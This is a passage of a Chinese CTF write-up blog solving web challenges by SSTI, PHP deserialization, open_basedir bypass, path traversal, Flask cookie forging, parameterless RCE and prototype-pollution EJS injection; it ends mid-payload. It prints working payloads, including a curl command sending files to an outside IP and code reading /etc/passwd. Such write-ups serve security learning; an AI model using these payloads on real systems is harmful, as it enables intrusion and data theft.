id="klf-ssti"><a href="#klf-ssti" class="headerlink" title="klf_ssti"></a>klf_ssti</h2><p>index.php啥也没有，查看源码，去看看&#x2F;hack</p><p>再看源码，提示我们传入klf参数，根据题目名字我们知道这里应该是ssti注入。</p><p>经过一系列尝试，发现无论输入什么都会是一个小黄脸嘲讽我们，那可能是ssit无回显。</p><p>找到万能payload</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">&#123;&#125;<span class="hljs-built_in">config</span>.__class__.__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;aaa&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><p>把aaa换成我们的命令，本来想尝试反弹shell，发现目标机好像不支持反弹shell，那么虽然无回显，我们可以通过将回显写入一个文件，再通过curl命令读取文件发送到我们的服务器上，完成伪反弹shell。</p><p>首先</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">&#123;&#125;<span class="hljs-built_in">config</span>.__class__.__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;ls /app&gt;1.txt&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><p>然后我们读取1.txt</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">&#123;&#125;<span class="hljs-built_in">config</span>.__class__.__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;curl -d @1.txt 47.108.89.135:2333&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><p>于此同时，我们在ssh上开启监听</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lnvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p>收到了回显，发现flag叫fl4gfl4gfl4g，那么</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"> &#123;&#125;config.__class__.__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;cat /app/fl4gfl4gfl4g</span><br><span class="hljs-string">&gt;1.txt&#x27;</span>).<span class="hljs-keyword">read</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><p>重复上述步骤，拿到flag</p><p>SYC{wvDsEswyYrqSKJYJme}</p><h2 id="ez-remove"><a href="#ez-remove" class="headerlink" title="ez_remove"></a>ez_remove</h2><p>短小精焊的反序列化，题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">syc</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;lover);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;web&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/lover/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;web&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;web&#x27;</span>]);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;快来玩快来玩~&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;nonono&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><strong>考点一：fast_destruct</strong></p><p>当一个PHP线程结束时，当前占用的所有内存空间都会被销毁，当前程序中的所有对象同样被销毁。</p><p>关键的eval函数被放在destruct方法里，正常析构函数只有在对象被垃圾收集器收集前（即对象从内存中删除之前）才会被自动调用。而这里程序多给了一句：<strong>throw new Error()</strong></p><p>这就导致__destruct方法无法被正常触发，所以我们得想办法提前触发__destruct</p><p>首先我们需要生成一个数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">syc</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br>改为<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">syc</span>(),<span class="hljs-string">&#x27;awawaw&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>然后我们需要把生产后的序列化代码的第二个i后面的数字改成0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;syc&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;lover&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;phpinfo();&quot;</span>;&#125;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;awawaw&quot;</span>;&#125; <br>改成<br>a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;syc&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;lover&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;phpinfo();&quot;</span>;&#125;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;awawaw&quot;</span>;&#125; <br></code></pre></td></tr></table></figure><p>这样改后，php反序列化完第一个数组，也就是payload的时候，计数器-1就会提前触发__destruct</p><p><strong>考点二：绕过变量名过滤</strong></p><p>题目中把唯一的变量lover过滤了，给个文章：<a href="https://blog.csdn.net/qq_45570082/article/details/107998748#t10">https://blog.csdn.net/qq_45570082/article/details/107998748#t10</a> 我们可以考虑大写的S编码绕过。</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">S:</span>encoded <span class="hljs-type">string</span><br>可以将<span class="hljs-number">16</span>进制编码成字符，可以进行绕过特定字符<br></code></pre></td></tr></table></figure><p>那么，了解到‘l’的16进制编码是‘6c’  把s:5:”lover”改成S:5:”\6cover”就能成功绕过。</p><p><strong>考点三：Open_basedir绕过</strong></p><p>打入payload发现system函数被禁用，看了看phpinfo发现命令执行函数都被ban了。</p><p>发现有open_basedir        &#x2F;var&#x2F;www&#x2F;html&#x2F;</p><p><a href="https://www.cnblogs.com/LLeaves/p/13210005.html">https://www.cnblogs.com/LLeaves/p/13210005.html</a></p><p>可以利用glob伪协议来读取文件目录。glob伪协议在筛选目录时不受open_basedir制约。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&#x27;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;&#x27;</span>, <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br><span class="hljs-variable">$file_list</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-comment">// normal files</span><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-variable">$file_list</span>[] = <span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>();<br>&#125;<br><span class="hljs-comment">// special files (starting with a dot(.))</span><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///.*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-variable">$file_list</span>[] = <span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>();<br>&#125;<br><span class="hljs-title function_ invoke__">sort</span>(<span class="hljs-variable">$file_list</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$file_list</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$f&#125;</span>&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>现成的payload，去掉换行和回车，转义引号：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span> =<span class="hljs-string">&#x27;printf(\&#x27;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;\&#x27;, ini_get(\&#x27;open_basedir\&#x27;));$file_list = array();$it = new DirectoryIterator(&quot;glob:///*&quot;);foreach($it as $f) &#123;$file_list[] = $f-&gt;__toString();&#125;$it = new DirectoryIterator(&quot;glob:///.*&quot;);foreach($it as $f) &#123;$file_list[] = $f-&gt;__toString();&#125;sort($file_list);foreach($file_list as $f)&#123;echo &quot;&#123;$f&#125;&lt;br/&gt;&quot;;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>读取到了根目录：</p><p><strong>open_basedir : &#x2F;var&#x2F;www&#x2F;html&#x2F;</strong> </p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs tcl">.<br>..<br>.dockerenv<br>bin<br>boot<br>dev<br>etc<br>f1ger<br>home<br>lib<br>lib64<br>media<br>mnt<br>opt<br><span class="hljs-keyword">proc</span><span class="hljs-title"></span><br><span class="hljs-title">root</span><br>run<span class="hljs-title"></span><br><span class="hljs-title">sbin</span><br>srv<span class="hljs-title"></span><br><span class="hljs-title">sys</span><br>tmp<span class="hljs-title"></span><br><span class="hljs-title">usr</span><br>var<br></code></pre></td></tr></table></figure><p>再利用ini_set读取文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;tmpdir&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;tmpdir&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>现成的payload，去掉换行和回车，转义引号：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>=<span class="hljs-string">&#x27;mkdir(\&#x27;tmpdir\&#x27;);chdir(\&#x27;tmpdir\&#x27;);ini_set(\&#x27;open_basedir\&#x27;,\&#x27;..\&#x27;);chdir(\&#x27;..\&#x27;);chdir(\&#x27;..\&#x27;);chdir(\&#x27;..\&#x27;);chdir(\&#x27;..\&#x27;);chdir(\&#x27;..\&#x27;);ini_set(\&#x27;open_basedir\&#x27;,\&#x27;/\&#x27;);$a=file_get_contents(\&#x27;/f1ger\&#x27;);var_dump($a);&#x27;</span>;<br></code></pre></td></tr></table></figure><p>打入题目获得flag：SYC{0ihPuPsdvLrLH2Owsm}</p><h2 id="ez-path"><a href="#ez-path" class="headerlink" title="ez_path"></a>ez_path</h2><p>给了一个pyc文件，需要反编译为python文件才能看到源码。</p><p><a href="https://www.toolkk.com/tools/pyc-decomplie">https://www.toolkk.com/tools/pyc-decomplie</a></p><p>一顿代码审计之后发现了os.path.join()函数，这个函数有个漏洞，如果传入的参数以&#x2F;开头，就会不管当前的路径，直接以你传入的&#x2F;开头的路径为返回值。</p><p>比如，我们文章名为abc，当前目录是&#x2F;var&#x2F;www&#x2F;html&#x2F;article&#x2F;</p><p>我们的文章路径就会是&#x2F;var&#x2F;www&#x2F;html&#x2F;article&#x2F;abc</p><p>而如果文章名是&#x2F;abc   我们的文章路径就是&#x2F;abc</p><p>发现网站源码里有flag名字：f14444</p><p>那么我们只需要文章名为&#x2F;f14444即可直接打开flag：</p><p>SYC{KfxR42aRRGkRrW8YN8}</p><h2 id="you-konw-flask"><a href="#you-konw-flask" class="headerlink" title="you konw flask?"></a>you konw flask?</h2><p>这把必当教练了奥！</p><p>注册登录题首先想到修改flask token登录，先注册一个帐号，拿到现在的session</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">eyJpc<span class="hljs-number">19</span>hZ<span class="hljs-name">G1</span>pbiI<span class="hljs-number">6</span>ZmFsc<span class="hljs-number">2</span>UsI<span class="hljs-name">m5</span>hbWUiOiIxIiwidX<span class="hljs-symbol">Nlcl9</span>pZCI<span class="hljs-number">6</span>M<span class="hljs-symbol">n0</span>.ZWHBvQ.YS<span class="hljs-attr">vcSY0</span>-B<span class="hljs-symbol">nAI37</span>sWrJyZAFaRUKk<br></code></pre></td></tr></table></figure><p>我们先要解密，才能修改数据，但是解密我们需要一个密钥。经过一顿找，发现在&#x2F;robots.txt里有东西&#x2F;3ysd8.html    打开后看源码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">key是  app<span class="hljs-selector-class">.secret_key</span> = <span class="hljs-string">&#x27;wanbao&#x27;</span>+base64<span class="hljs-selector-class">.b64encode</span>(<span class="hljs-built_in">str</span>(random<span class="hljs-selector-class">.randint</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>))<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)+<span class="hljs-string">&#x27;wanbao&#x27;</span><br></code></pre></td></tr></table></figure><p>拿到了源码，发现密钥是随机的，那我们需要遍历100个密钥，找到真正的密钥。</p><p>跑个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    secret_key = <span class="hljs-string">&#x27;wanbao&#x27;</span> + base64.b64encode(<span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>) + <span class="hljs-string">&#x27;wanbao&#x27;</span><br>    <span class="hljs-built_in">print</span>(secret_key)<br></code></pre></td></tr></table></figure><p>然后出来了100个密钥，我们用github上的一个工具，flask-session-cookie-manager-master来测试每个密钥正不正确，100可以手测，但是脚本更快，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cat</span> ~/Downloads/book.txt);<span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&quot;\r\n&quot;</span>;python ~/web/flask-session-cookie-manager-master/flask_session_cookie_manager3.py decode -s $(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&quot;\r\n&quot;</span>) -c <span class="hljs-string">&quot;eyJpc19hZG1pbiI6ZmFsc2UsIm5hbWUiOiIxIiwidXNlcl9pZCI6Mn0.ZWHBvQ.YSvcSY0-BnAI37sWrJyZAFaRUKk&quot;</span>; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>这个脚本可以把book.txt里的100个密钥分别测试，如果能成功解密，就打印这个密钥。</p><p>经过测试，发现密钥为wanbaoOTg&#x3D;wanbao</p><p>而解密后的json数据是{‘is_admin’: False, ‘name’: ‘1’, ‘user_id’: 2}</p><p>显而易见，我们要把is_admin的值改为True，然后再通过密钥加密成session</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python ~/web/flask-session-cookie-manager-master/flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;wanbaoOTg=wanbao&#x27;</span> -t <span class="hljs-string">&quot;&#123;&#x27;is_admin&#x27;: True, &#x27;name&#x27;: &#x27;1&#x27;, &#x27;user_id&#x27;: 2&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>替换原来的cookie</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">eyJpc<span class="hljs-number">19</span>hZ<span class="hljs-name">G1</span>pbiI<span class="hljs-number">6</span>dHJ<span class="hljs-number">1</span>ZSwibmFtZSI<span class="hljs-number">6</span>IjEiLCJ<span class="hljs-number">1</span>c<span class="hljs-number">2</span>VyX<span class="hljs-number">2</span>lkIjoyfQ.ZWHFLQ.CvOT<span class="hljs-number">4</span>HS<span class="hljs-number">6</span>-TxGX_tsrjgDUwkvYEA<br></code></pre></td></tr></table></figure><p>刷新页面，发现自己成为了教练力！进入学员管理，拿到flag</p><p>SYC{k49Ba0dwVuBxT7rqGQ}</p><h2 id="Pupyy-rce"><a href="#Pupyy-rce" class="headerlink" title="Pupyy_rce"></a>Pupyy_rce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$var</span>))<br></code></pre></td></tr></table></figure><p>经典无参数rce</p><p>提示在当前目录下有flag，这样可以直接使用随机读取当前目录文件payload</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">readfile</span></span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">pos</span>(<span class="hljs-title">localeconv</span>())))));</span><br></code></pre></td></tr></table></figure><p>这是随机读文件，多试几次就能读到flag：</p><p>SYC{szmkLiIQ3ujD1BBWvV}</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">pos</span><span class="hljs-params">(localeconv()</span></span>)是点<br><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span>扫描当前目录文件<br><span class="hljs-function"><span class="hljs-title">array_flip</span><span class="hljs-params">()</span></span>将读取当前目录的键和值进行反转<br>其中的键可以利用随机数函数<span class="hljs-built_in">array_rand</span>()，进行随机生成<br>然后利用<span class="hljs-built_in">readfile</span>()函数，读取该文件<br></code></pre></td></tr></table></figure><h2 id="雨"><a href="#雨" class="headerlink" title="雨"></a>雨</h2><p>让我们看&#x2F;source，说我们不是admin，应该也是修改cookie登录，我们先找到cookie</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">eyJhbGciOiJIUzI<span class="hljs-number">1</span><span class="hljs-symbol">NiIsInR5</span>cCI<span class="hljs-number">6</span>IkpX<span class="hljs-attr">VCJ9</span>.eyJ<span class="hljs-number">1</span>c<span class="hljs-number">2</span>VyIjoiZ<span class="hljs-number">3</span>Vlc<span class="hljs-number">3</span>QiLCJpYXQiOjE<span class="hljs-number">3</span>MDA<span class="hljs-number">5</span>MDgyMjl<span class="hljs-number">9.</span><span class="hljs-symbol">N6</span>H<span class="hljs-number">2</span>hwmB<span class="hljs-number">3</span>HWj<span class="hljs-number">1</span>CX<span class="hljs-number">1</span>xa<span class="hljs-symbol">NMgRWNcQZVK1</span>x<span class="hljs-number">5</span>Rj<span class="hljs-number">8</span>ad<span class="hljs-symbol">N4</span>uWEo<br></code></pre></td></tr></table></figure><p>我们还是要先找到密钥，查看当前页面源码，发现&#x2F;hint，进去提示我们说密钥是出题人名字，VanZY</p><p><a href="https://jwt.io/%E5%9C%A8%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E9%87%8C%E7%9B%B4%E6%8E%A5%E4%BF%AE%E6%94%B9cookie%E5%86%85%E5%AE%B9%EF%BC%8C%E6%8A%8Aguess%E6%8D%A2%E4%B8%BAadmin%EF%BC%8C%E5%86%8D%E6%89%93%E5%85%A5cookie%EF%BC%8C%E5%88%B7%E6%96%B0%EF%BC%8C%E7%9C%8B%E8%A7%81%E6%BA%90%E7%A0%81%E3%80%82">https://jwt.io/在这个网站里直接修改cookie内容，把guess换为admin，再打入cookie，刷新，看见源码。</a></p><p>审计源码发现：**res.render(‘index’, req.body);<strong>有两个命令执行点，第一个需要让</strong>Super[‘userrole’] &#x3D;&#x3D;&#x3D; ‘Superadmin’**第二个需要绕过过滤，过滤了所有能使用的函数，所以我们需要从第一个点进入，</p><p>var Super &#x3D; {};定义好了，而我们需要让super变成数组，并传入**”userrole”:”Superadmin”**</p><p>这道题考js原型链污染</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">在/code路由里发现污染点<br><span class="hljs-title function_">putil_merge</span>(&#123;&#125;, req.<span class="hljs-property">body</span>, &#123; <span class="hljs-attr">deep</span>: <span class="hljs-literal">true</span> &#125;<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;userrole&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Superadmin&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br>发现这样污染不行，换个payload<br></code></pre></td></tr></table></figure><p>每个构造函数(constructor)都有一个原型对象(prototype)</p><p>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></p><p>JavaScript使用prototype链实现继承机制</p><p>下面这条payload能成功污染原型链：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;userrole&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Superadmin&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>再在&#x2F;create路由里进行<strong>Ejs模板引擎注入实现RCE</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;aaa&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;view options&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;escapeFunction&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;console.log;this.global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;xxx&#x27;);&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;client&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;true&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>拿到模板，将xxx的内容修改为反弹shell命令，完整payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 